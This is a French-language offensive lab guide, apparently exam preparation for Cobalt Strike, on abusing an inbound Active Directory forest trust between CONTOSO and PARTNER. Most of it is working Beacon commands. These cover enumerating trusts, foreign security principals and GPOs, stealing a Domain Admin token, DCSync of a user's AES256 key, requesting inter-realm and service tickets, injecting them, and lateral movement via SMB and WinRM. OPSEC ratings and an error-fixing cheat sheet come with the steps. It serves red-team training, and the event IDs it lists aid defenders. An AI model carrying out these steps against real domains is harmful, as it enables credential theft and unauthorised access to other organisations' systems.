# Lab — Relations de confiance entrantes (Inbound Trusts)

> Ce lab étudie l’accès entre deux domaines liés par une relation de confiance entrante à sens unique.

===

## Comprendre le sens de la relation de confiance

Commencer par identifier le sens de la relation de confiance : il détermine quels utilisateurs peuvent accéder aux ressources de l’autre domaine.

```
┌─────────────────────────────────────┐        ┌─────────────────────────────────────┐
│          CONTOSO.COM                │        │           PARTNER.COM               │
│   (OUR domain — beacon runs here)   │        │  (foreign/trusting domain)          │
│                                     │        │                                     │
│  Domain SID:                        │        │  Domain SID:                        │
│  S-1-5-21-3926355307-               │        │  S-1-5-21-4244029708-               │
│       1661546229-813047887          │        │       1901239654-2578485347         │
│                                     │        │                                     │
│  trustDirection = 1 (INBOUND)  ◄────┼────────┼──  PARTNER trusts CONTOSO           │
│                                     │        │                                     │
│  "Inbound to us = we are trusted"   │        │  Resources: par-jmp-1.partner.com   │
│  "Our users can go there"           │        │  DC:        par-dc-1.partner.com    │
└─────────────────────────────────────┘        └─────────────────────────────────────┘
         TRUSTED domain                                   TRUSTING domain
   (accounts originate here)                        (resources are here)
```

**Interprétation de `trustDirection` pour le lab :**
- `trustDirection=1 INBOUND` (interrogé depuis CONTOSO) → PARTNER fait confiance à CONTOSO : les utilisateurs CONTOSO peuvent s’authentifier sur les ressources PARTNER, sous réserve des autorisations.
- `trustDirection=2 OUTBOUND` → CONTOSO fait confiance à l’autre domaine : ses utilisateurs peuvent s’authentifier sur les ressources CONTOSO.
- `trustDirection=3` → bidirectionnelle

**`trustAttributes=8` (TRUST_ATTRIBUTE_FOREST_TRANSITIVE)** indique une relation transitive entre forêts. Le filtrage des SID à la frontière empêche certains usages de SID History ; les appartenances configurées via des Foreign Security Principals (FSP) restent pertinentes.

---

## Identifier les objets dans les deux domaines

Ce tableau associe les SID du lab aux utilisateurs et groupes présents dans CONTOSO et PARTNER.

| SID | Domaine | Type d’objet | Nom | Rôle dans le lab |
|-----|--------|-------------|------|--------------------|
| S-1-5-21-**3926355307**-1661546229-813047887-**500** | CONTOSO | Utilisateur | Administrator | Compte Domain Admin initial |
| S-1-5-21-**3926355307**-1661546229-813047887-**6102** | CONTOSO | Groupe | **Partner Jump Users** | Groupe utilisé pour l’attribution de droits dans PARTNER via FSP |
| S-1-5-21-**3926355307**-1661546229-813047887-**XXXX** | CONTOSO | Utilisateur | **rsteel** | Compte membre du groupe Partner Jump Users |
| S-1-5-21-**4244029708**-1901239654-2578485347-**1104** | PARTNER | Groupe | **Contoso Users** | Groupe PARTNER contenant le SID CONTOSO via un objet FSP |
| S-1-5-**32**-544 | BUILTIN | Groupe | Administrators | Groupe administrateurs locaux ; Contoso Users y est associé par GPO dans le lab |

**Schéma des relations d’accès :**

```
rsteel (CONTOSO user)
  └─ member of: "Partner Jump Users" (CONTOSO group, SID -6102)
                    │
                    │  Foreign Security Principal in PARTNER
                    │  (PARTNER stores a proxy object with SID -6102)
                    ▼
             "Contoso Users" group (PARTNER group, SID -1104)
                    │
                    │  GPO: "Contoso Jump Users" → linked to entire PARTNER domain
                    ▼
             BUILTIN\Administrators (S-1-5-32-544)
             on ALL computers in PARTNER
                    │
                    ▼
             par-jmp-1.partner.com — rsteel is local admin here
```

**Qu’est-ce qu’un Foreign Security Principal (FSP) ?**
Lorsqu’un groupe CONTOSO devient membre d’un groupe PARTNER, le domaine PARTNER crée un objet FSP dans `CN=ForeignSecurityPrincipals,DC=partner,DC=com` pour représenter son SID. Dans le scénario, le SID de **Partner Jump Users** (`-6102`) permet de relier l’identité `rsteel` au groupe PARTNER **Contoso Users** (`-1104`), selon les relations de groupe configurées.

---

## Comprendre le parcours des tickets Kerberos

```
Step 1: DCSync rsteel hash from CONTOSO DC
         ↓
Step 2: AS-REQ → CONTOSO KDC (lon-dc-1)
         → returns: TGT_rsteel  (encrypted with CONTOSO krbtgt key)
         ↓
Step 3: TGS-REQ for krbtgt/partner.com → CONTOSO KDC
         → CONTOSO KDC sees inbound trust to PARTNER, issues referral
         → returns: INTER-REALM TGT  (encrypted with inter-realm trust key)
                    ↳ contains rsteel's SIDs including "Partner Jump Users" (-6102)
         ↓
Step 4: TGS-REQ for cifs/par-jmp-1 → PARTNER KDC (par-dc-1)
         → PARTNER KDC decrypts inter-realm TGT with trust key
         → resolves FSP: -6102 → "Contoso Users" (-1104)
         → adds -1104 to rsteel's PAC
         → returns: SERVICE TICKET for cifs/par-jmp-1  (encrypted with par-jmp-1 key)
         ↓
Step 5: SMB to par-jmp-1 with service ticket
         → par-jmp-1 sees "Contoso Users" (-1104) in PAC
         → GPO says -1104 = local admin
         → ACCESS GRANTED
```

**À retenir :** le parcours fait intervenir un TGT CONTOSO, un TGT inter-realm au passage de la relation de confiance, puis un ticket de service PARTNER. Les tickets sont délivrés par différentes autorités Kerberos.

===

## Énumération

### Informations à vérifier
Vérifier l’existence et le sens de la trust, l’objet CONTOSO référencé dans PARTNER, son type et les utilisateurs membres du groupe concerné.

1. Ouvrir Cobalt Strike et se connecter au team server.
2. Dans le Beacon de moyenne intégrité, énumérer les relations de confiance.

    ```Beacon-nocolor
    ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
    ```

    > Cette requête recherche les objets `trustedDomain` dans CONTOSO et récupère quatre attributs :
    > - `trustPartner` — le nom FQDN du domaine distant (ici `partner.com`)
    > - `trustDirection` — la direction de la trust depuis CONTOSO
    > - `trustAttributes` — les indicateurs décrivant le type de trust
    > - `flatname` — le nom NetBIOS du domaine distant (ici `PARTNER`)

⚠️ Comment interpréter ces résultats ?
    >
    > - `trustDirection 1` = **TRUST_DIRECTION_INBOUND** — PARTNER fait confiance à CONTOSO ; certains utilisateurs CONTOSO peuvent s’authentifier sur des ressources PARTNER.
    > - `trustAttributes 8` = **TRUST_ATTRIBUTE_FOREST_TRANSITIVE** — relation entre forêts ; le filtrage des SID limite les utilisations de SID History entre les domaines. Les appartenances FSP restent prises en compte.

3. Énumérer le conteneur Foreign Security Principals du domaine distant.

    ```Beacon-nocolor
    ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
    ```

    > **Fonctionnement :** les options `--hostname partner.com` et `--dn DC=partner,DC=com` ciblent l’annuaire PARTNER. Le filtre cherche les objets `foreignSecurityPrincipal` représentant les comptes et groupes externes.
    >
    > **Pourquoi interroger PARTNER ?** La relation de confiance permet, selon les permissions configurées, certaines requêtes LDAP du contexte CONTOSO vers PARTNER.
    >
    > L’attribut `objectSid` de l’objet FSP représente le SID CONTOSO référencé. `memberOf` indique les groupes PARTNER auxquels l’objet appartient.

⚠️ Le résultat attendu indique que le SID CONTOSO `S-1-5-21-3926355307-1661546229-813047887-6102` est associé au groupe **Contoso Users** dans PARTNER.

    > **À ce stade :** un objet CONTOSO portant le SID `-6102` est référencé par PARTNER. Il reste à déterminer s’il s’agit d’un utilisateur ou d’un groupe.

4. Identifier l’objet correspondant à ce SID dans CONTOSO.

    ```Beacon-nocolor
    ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attributes samAccountType,distinguishedName
    ```

    > **Fonctionnement :** la requête vise à nouveau CONTOSO et recherche l’objet propriétaire du SID se terminant par `-6102`.
    >
    > `samAccountType` identifie le type d’objet :
    > - `805306368` = compte utilisateur
    > - `268435456` = groupe de domaine (résultat attendu)
    > - `805306369` = compte ordinateur

⚠️ Le résultat du lab identifie le groupe CONTOSO **Partner Jump Users**. Ce groupe est associé à **Contoso Users** dans PARTNER grâce au FSP. Les droits effectifs sont ensuite définis par la GPO.

5. Énumérer les membres de ce groupe.

    ```Beacon-nocolor
    ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
    ```

    > **Fonctionnement :** rechercher les utilisateurs et groupes membres directs de **Partner Jump Users** dans CONTOSO, en utilisant le DN complet du groupe dans le filtre `memberof`.
    >
    > **Utilité :** l’appartenance à ce groupe indique quels comptes CONTOSO disposent d’une relation d’autorisation vers PARTNER, selon les règles définies dans le lab.

⚠️ Résultat attendu : `rsteel`, utilisateur CONTOSO membre de **Partner Jump Users**.

6. Identifier un Domain Controller du domaine distant.

    ```Beacon-nocolor
    nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
    ```

    > **Fonctionnement :** une recherche DNS SRV sur le DC `10.10.120.1` identifie le Domain Controller PARTNER. Le résultat attendu est `par-dc-1.partner.com`, utilisé ensuite dans les échanges Kerberos du lab.

===

## Discovery

Énumérer PARTNER pour déterminer sur quelles machines le groupe **Contoso Users** dispose de privilèges.

### Informations à vérifier
Le groupe **Contoso Users** existe dans PARTNER. Il faut vérifier si ses droits administrateur locaux proviennent d’une GPO et identifier les machines concernées.

1. Lister les GPO.

    ```Beacon-nocolor
    ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
    ```

    > La requête recense les Group Policy Objects de PARTNER. L’attribut `gPCFileSysPath` indique le chemin SYSVOL contenant leurs fichiers de configuration.

⚠️ Le lab présente une GPO **Contoso Jump Users**, dont `gPCFileSysPath` renvoie le chemin contenant son GUID : `\\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\`

2. Récupérer le fichier `GptTmpl.inf` de la GPO.

    ```Beacon-nocolor
    download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
    ```

    > `GptTmpl.inf` est un fichier de modèle de sécurité GPO. La section `[Group Membership]` indique les SID ajoutés aux groupes locaux, sans nécessiter de session interactive sur la machine.
    >
    > Dans ce scénario, le téléchargement SMB utilise le contexte Kerberos disponible, sous réserve des autorisations prévues par la relation de confiance.

3. Synchroniser le fichier sur l’Attacker Desktop, puis l’ouvrir avec Notepad.

⚠️ Le fichier contient :
    > ```
    > [Group Membership]
    > *S-1-5-21-4244029708-1901239654-2578485347-1104__Memberof = *S-1-5-32-544
    > ```
    > Interprétation : le SID PARTNER `S-1-5-21-4244029708-...-1104` correspond à **Contoso Users**. Ce groupe est associé à `S-1-5-32-544`, le groupe local **Administrators**, sur les machines auxquelles la GPO s’applique.
    >
    > **Détail des SID :**
    > - `S-1-5-21-4244029708-1901239654-2578485347` → préfixe SID du domaine PARTNER
    > - `-1104` → RID du groupe Contoso Users dans PARTNER
    > - `S-1-5-32-544` → SID bien connu du groupe Administrators local

4. Vérifier que **Contoso Users** (`-1104`, PARTNER) contient le FSP du groupe **Partner Jump Users** (`-6102`, CONTOSO).

    ```Beacon-nocolor
    ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes samAccountType,samAccountName,member
    ```

    > Cette requête identifie le groupe PARTNER portant le SID `-1104`. L’attribut `member` permet de vérifier la présence du FSP correspondant à **Partner Jump Users**, puis de relier cette appartenance aux droits locaux définis par GPO.

5. Identifier les objets auxquels la GPO est liée.

    ```Beacon-nocolor
    ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*)) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name
    ```

    > La recherche examine l’attribut `gPLink` des OU et objets du domaine PARTNER afin de localiser la GPO étudiée.

⚠️ Dans le scénario, la GPO est liée à la racine du domaine PARTNER. Son application effective dépend également des paramètres et filtres de stratégie.

6. Lister les ordinateurs présents dans le domaine distant.

    ```Beacon-nocolor
    ldapsearch (samAccountType=805306369) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes distinguishedName
    ```

    > `samAccountType=805306369` correspond aux comptes ordinateur. Cette recherche répertorie les machines de PARTNER, notamment `par-jmp-1.partner.com` dans le scénario.

===

## Scénario d’exploitation du lab

### Objectif de cette phase
Dans ce scénario, un compte disposant de droits Domain Admin existe dans CONTOSO. L’utilisateur `rsteel` bénéficie d’autorisations locales dans PARTNER via les groupes de confiance. La suite illustre le cheminement des tickets Kerberos entre les deux domaines.

**Compte étudié :** `rsteel` — utilisateur CONTOSO membre de **Partner Jump Users**
**Machine cible :** `par-jmp-1.partner.com` — serveur PARTNER sur lequel le lab attribue des droits d’administration locale à `rsteel`

> **Point important pour l’examen :**
> DCSync nécessite des permissions de réplication AD appropriées. Le compte local `NT AUTHORITY\SYSTEM` d’une workstation ne dispose pas automatiquement de ces droits ; une demande non autorisée peut renvoyer `ERROR_DS_DRA_ACCESS_DENIED (0x20f7)`.
> `krb_asktgt` et `krb_asktgs` obtiennent des tickets, tandis que `kerberos_ticket_use` les charge dans la session Kerberos utilisée par le Beacon.

---

1. **OPSEC-🟢SAFE** — Étudier le contexte d’un token Domain Admin dans un Beacon de haute intégrité.

    ```cs
    beacon> process_browser                    // find a process owned by dyork
    beacon> steal_token <dyork-pid>            // impersonate CONTOSO\dyork in-process, no spawn
    ```

    > Cette étape utilise le token de `dyork` dans le scénario. Les droits `DS-Replication-Get-Changes-All` sont nécessaires pour certaines opérations de réplication ; SYSTEM sur un poste membre ne les possède pas automatiquement.
    >
    > ⚠️ **Point d’attention :** un compte sans droits de réplication peut provoquer l’erreur `ERROR_DS_DRA_ACCESS_DENIED (0x20f7)`.

2. **OPSEC-🟠CAUTION** — Examiner la récupération du hash AES256 de `rsteel` dans le lab.

    ```cs
    beacon> dcsync contoso.com CONTOSO\rsteel
    ```

    > **Pourquoi `rsteel` ?** Il appartient au groupe **Partner Jump Users**, relié à PARTNER par FSP. L’événement 4662 peut être journalisé lors d’une opération de réplication, selon la politique d’audit.
    >
    > Journal d’événements : **4662** sur `lon-dc-1` — accès au service d’annuaire, propriété : `DS-Replication-Get-Changes-All`

3. **OPSEC-🟠CAUTION** — Demander un TGT pour `rsteel` au KDC CONTOSO.

    ```cs
    beacon> krb_asktgt /user:rsteel /aes256:<aes256_hmac-from-dcsync>
    ```

    > Une requête AS-REQ est adressée au KDC CONTOSO dans le scénario. Le TGT est lié au domaine émetteur et protégé par les clés Kerberos appropriées.
    >
    > **Ticket obtenu :** `TGT_rsteel` — valable pour CONTOSO.
    >
    > **Sortie :** conserver le ticket Base64 du lab pour les étapes suivantes.
    >
    > Journal d’événements : **4768** (AS-REQ) sur `lon-dc-1`

4. **OPSEC-🟠CAUTION** — Demander un ticket de référence inter-realm.

    ```cs
    beacon> krb_asktgs /service:krbtgt/partner.com /ticket:<base64-TGT>
    ```

    > Le KDC CONTOSO traite une requête TGS-REQ vers `krbtgt/partner.com`. La relation de confiance permet l’émission d’un ticket de référence inter-realm protégé par les secrets de confiance.
    >
    > **Ticket obtenu :** `INTER-REALM TGT` — ticket destiné au traitement par le KDC PARTNER, avec les informations d’identité et d’appartenance du scénario.
    >
    > **Sortie :** ticket Base64 réutilisé dans les étapes suivantes du lab.
    >
    > Journal d’événements : **4769** (TGS-REQ pour `krbtgt/partner.com`) sur `lon-dc-1` — événement lié à une demande Kerberos inter-realm.

5. **OPSEC-🟠CAUTION** — Demander un ticket de service CIFS pour `par-jmp-1` auprès de PARTNER.

    ```cs
    beacon> krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
    ```

    > La requête TGS-REQ est adressée au **KDC PARTNER** (`/dc:par-dc-1.partner.com`). Dans le scénario, ce KDC :
    > 1. Déchiffre le TGT inter-realm avec la clé de confiance et valide son origine CONTOSO.
    > 2. Analyse le PAC de `rsteel` et le SID `-6102` (Partner Jump Users).
    > 3. Résout le FSP reliant `-6102` au groupe **Contoso Users** (`-1104`).
    > 4. Prend en compte l’appartenance au groupe `-1104` lors de la création du ticket.
    > 5. Délivre un ticket de service CIFS protégé par la clé du compte machine `par-jmp-1`.
    >
    > **Ticket obtenu :** `SERVICE TICKET` pour `cifs/par-jmp-1.partner.com` — le PAC référence le groupe `-1104`, auquel la GPO associe des permissions locales.
    >
    > **Fichier de sortie :** `rsteel_cifs.kirbi`, obtenu à partir de la valeur Base64.
    >
    > Journal d’événements : **4769** sur `par-dc-1` — événement enregistré dans l’infrastructure PARTNER.

5b. **OPSEC-🟠CAUTION** — Demander également un ticket HTTP pour le scénario WinRM.

```cs
beacon> krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
```

    > WinRM utilise généralement le SPN **`http`**, contrairement aux accès SMB basés sur `cifs`. Dans ce lab, une session dépourvue du ticket adapté peut rencontrer l’erreur `0x8009030e`.
    >
    > **Ticket inter-realm :** le scénario utilise ce ticket pour examiner deux services distincts, `cifs` et `http`.
    >
    > **Fichier de sortie :** `rsteel_http.kirbi`, obtenu à partir de la valeur Base64.
    >
    > Journal d’événements : **4769** sur `par-dc-1`

6. **OPSEC-🟢SAFE** — Décoder les fichiers `.kirbi` sur l’Attacker Desktop.

    ```powershell
    # Run on attacker Windows desktop (not in beacon) — CyberChef or PowerShell:
    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_cifs.kirbi",
      [System.Convert]::FromBase64String("<base64-from-step-5>"))

    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_http.kirbi",
      [System.Convert]::FromBase64String("<base64-from-step-5b>"))

    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_tgt.kirbi",
      [System.Convert]::FromBase64String("<base64-from-step-3>"))
    ```

    > Opération locale de traitement de fichiers.

7. **OPSEC-🟢SAFE** — Importer le ticket CIFS et vérifier le résultat.

    ```cs
    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_cifs.kirbi
    beacon> run klist
    ```

    > `kerberos_ticket_use` charge le fichier `.kirbi` dans la session Kerberos active du Beacon. Sans import, les connexions utilisent le contexte d’authentification déjà disponible.
    >
    > Vérifier que la sortie de `klist` contient : `Server: cifs/par-jmp-1.partner.com @ PARTNER.COM`
    > Le suffixe `@ PARTNER.COM` indique le domaine de service concerné.
    >
    > ⚠️ **Point d’attention :** un ticket obtenu mais non disponible dans la session utilisée peut provoquer `ERROR_ACCESS_DENIED (5)` lors d’un accès SMB.

8. **OPSEC-🟢SAFE** — Vérifier l’accès SMB à `par-jmp-1` dans le lab.

    ```cs
    beacon> ls \\par-jmp-1.partner.com\c$
    ```

    > Lors d’une authentification SMB, le serveur valide le ticket de service et les autorisations associées aux groupes présents dans le PAC. Le résultat dépend de la GPO et des droits effectifs.
    >
    > Journal d’événements : **4624 type 3** (connexion réseau) sur `par-jmp-1` — authentification SMB dans le lab.

9. **OPSEC-🟢SAFE** — Étudier le Lateral Movement vers `par-jmp-1` avec WinRM.

    ```cs
    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_http.kirbi
    beacon> run klist                           // verify: http/par-jmp-1.partner.com @ PARTNER.COM
    beacon> jump winrm64 par-jmp-1.partner.com smb
    ```

    > Dans le scénario, WinRM utilise un ticket lié au service `http`. La connexion du Beacon distant est ensuite représentée par le mécanisme Cobalt Strike décrit dans le lab.
    >
    > ⚠️ **Point d’attention :** les tickets `cifs` et `http` correspondent à des services différents. Un ticket absent ou inadapté au service peut provoquer une erreur de connexion Kerberos.
    >
    > Journal d’événements : **4624 type 3** sur `par-jmp-1` — connexion réseau WinRM du compte `rsteel`.

10. **Nettoyage** — OPSEC-🟢SAFE.

    ```cs
    beacon> kerberos_ticket_purge               // remove all injected tickets from session
    beacon> rev2self                            // drop dyork impersonation token
    ```

⚠️ **Bilan du lab :** cette relation de confiance entrante permet d’étudier le cheminement Kerberos entre CONTOSO et PARTNER, ainsi que les événements de sécurité associés (notamment 4662, 4768, 4769 et 4624). Les traces exactes dépendent de la configuration et des opérations réalisées.

===

## Aide-mémoire pour l’examen

### Interpréter le sens d’une relation de confiance
```
Query your domain → find trustedDomain objects

trustDirection=1 (INBOUND)  → YOU are trusted → YOUR users access THEIR resources
trustDirection=2 (OUTBOUND) → THEY are trusted → THEIR users access YOUR resources
trustDirection=3 (BOTH)     → bidirectional
trustAttributes=8           → forest trust → SID filtering ON → no SID history abuse
trustAttributes=32          → TREAT_AS_EXTERNAL → SID filtering partially relaxed
```

### Chaîne des tickets entre domaines
```
0. steal_token <DA-pid>                                                      OPSEC-🟢SAFE   PREREQUISITE
1. dcsync <domain> <DOMAIN\user>                                             OPSEC-🟠CAUTION Event 4662 on source DC
2. krb_asktgt /user:<user> /aes256:<hash>         → TGT                     OPSEC-🟠CAUTION Event 4768 on source DC
3. krb_asktgs /service:krbtgt/foreign.domain      → INTER-REALM TGT         OPSEC-🟠CAUTION Event 4769 on source DC
4. krb_asktgs /service:cifs/target /dc:foreign-dc → CIFS SERVICE TICKET     OPSEC-🟠CAUTION Event 4769 on foreign DC
4b.krb_asktgs /service:http/target /dc:foreign-dc → HTTP SERVICE TICKET     OPSEC-🟠CAUTION Event 4769 on foreign DC
5. [decode base64 → .kirbi on attacker desktop]                              OPSEC-🟢SAFE   local only
6. kerberos_ticket_use <cifs.kirbi>               → inject CIFS ticket       OPSEC-🟢SAFE   REQUIRED before ls
7. ls \\target\c$                                 → SMB access confirmed     OPSEC-🟢SAFE   Event 4624 T3 on target
8. kerberos_ticket_use <http.kirbi>               → inject HTTP ticket       OPSEC-🟢SAFE   REQUIRED before winrm
9. jump winrm64 target smb                        → beacon in wsmprovhost    OPSEC-🟢SAFE   Event 4624 T3 on target
10.kerberos_ticket_purge + rev2self               → cleanup                  OPSEC-🟢SAFE
```

### Erreurs courantes et corrections
```
ERROR_DS_DRA_ACCESS_DENIED (0x20f7) on dcsync
  → You skipped steal_token. SYSTEM on a workstation ≠ DA rights.
  → Fix: process_browser → steal_token <DA-pid> → retry dcsync

ERROR_ACCESS_DENIED (5) on ls after krb_asktgs
  → You skipped kerberos_ticket_use. The ticket was obtained but not wired in.
  → Fix: decode base64 → .kirbi → kerberos_ticket_use <cifs.kirbi> → retry ls

0x8009030e logon session error on jump winrm64
  → You only injected the CIFS ticket. WinRM uses http SPN, not cifs.
  → Fix: krb_asktgs http/target + kerberos_ticket_use <http.kirbi> → retry jump winrm64
  → Also check: klist should show http/target @ FOREIGN.DOMAIN before jump
```

### Identifier les SID par préfixe de domaine
```
S-1-5-21-3926355307-1661546229-813047887-XXXX  → CONTOSO object
S-1-5-21-4244029708-1901239654-2578485347-XXXX → PARTNER object
S-1-5-32-544                                    → BUILTIN\Administrators (local, any machine)
```

### Points à vérifier pendant l’énumération
```
FSP (foreignSecurityPrincipal) in foreign domain  → a CONTOSO object has access in PARTNER
objectSid on FSP has YOUR domain prefix            → resolve it in YOUR domain
GptTmpl.inf [Group Membership] section            → shows which SID → which local group
gPLink on domain/OU object                        → shows GPO scope (domain-wide = all machines)
samAccountType=805306369                           → computer accounts (valid targets)
```
